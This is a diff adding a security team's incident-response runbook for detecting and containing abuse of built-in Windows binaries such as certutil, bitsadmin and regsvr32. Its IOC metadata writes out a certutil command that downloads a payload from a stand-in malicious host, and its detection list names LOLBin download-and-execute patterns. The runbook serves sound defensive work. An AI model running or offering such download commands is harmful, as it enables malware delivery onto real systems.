@@ -1,0 +1,101 @@
+Title: Living Off The Land Binaries (LOLBins) Abuse
+Severity: High
+MITRE ATT&CK: T1218, T1216
+Version: 1.0
+Last Updated: 15-Nov-2025
+Author: Security Operations Team
+Environment: Endpoints, Windows Systems
+Tools: EDR, SIEM, Sysmon, Command-line Auditing
+DETECTION:
+
+Unusual usage of built-in Windows binaries (certutil, bitsadmin, mshta)
+Regsvr32 executing scripts
+Rundll32 with unusual DLLs or command lines
+Certutil used for downloading files
+Wmic executing remote commands
+Msiexec installing from remote URLs
+Bitsadmin downloading suspicious files
+
+INVESTIGATION:
+
+Check EDR/SIEM logs for:
+
+LOLBin process name and command-line arguments
+Parent process that spawned LOLBin
+Files downloaded or executed by LOLBin
+Network connections from LOLBin
+User account executing LOLBin
+
+
+Analyze command-line parameters:
+
+URLs or file paths referenced
+Encoded or obfuscated commands
+Unusual arguments not typical for business use
+
+
+Check downloaded/created files:
+
+File hashes and locations
+Submit to VirusTotal, Any.run
+Check for malware signatures
+
+
+Correlate with other alerts:
+
+Was this part of a larger attack chain?
+Recent phishing emails or malware infections?
+
+
+
+IMMEDIATE ACTIONS:
+
+Isolate endpoint if malicious activity confirmed
+Kill LOLBin process if still running
+Quarantine downloaded malicious files
+Block C2 URLs/IPs identified
+
+CONTAINMENT:
+
+Delete malicious files downloaded by LOLBins
+Check for persistence mechanisms created
+Run Malware Infection Runbook if malware deployed
+Review all systems for similar LOLBin abuse patterns
+Block suspicious URLs at proxy/firewall
+
+POST-INCIDENT:
+
+Document LOLBin usage and malicious activity
+Update EDR detection rules for LOLBin abuse
+Monitor for 20 days for similar activity
+Security awareness training on LOLBin techniques
+
+LESSONS LEARNED:
+
+Baseline normal usage of LOLBins in environment
+Command-line logging for all processes
+Application whitelisting with argument restrictions
+EDR rules for suspicious LOLBin usage patterns
+Monitor LOLBAS (lolbas-project.github.io) for new techniques
+Block unnecessary LOLBins via AppLocker/WDAC
+
+METADATA:
+json{
+  "related_runbooks": "Malware Infection Runbook, Suspicious Powershell Runbook",
+  "ioc": [
+    {
+      "Type": "process",
+      "Value": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe",
+      "Action": "blocked",
+      "duration_in_days": 90,
+      "ckc_stage": "execution"
+    },
+    {
+      "Type": "url",
+      "Value": "http://malicious.com/payload.exe",
+      "Action": "blocked",
+      "duration_in_days": 365,
+      "ckc_stage": "delivery"
+    }
+  ]
+}
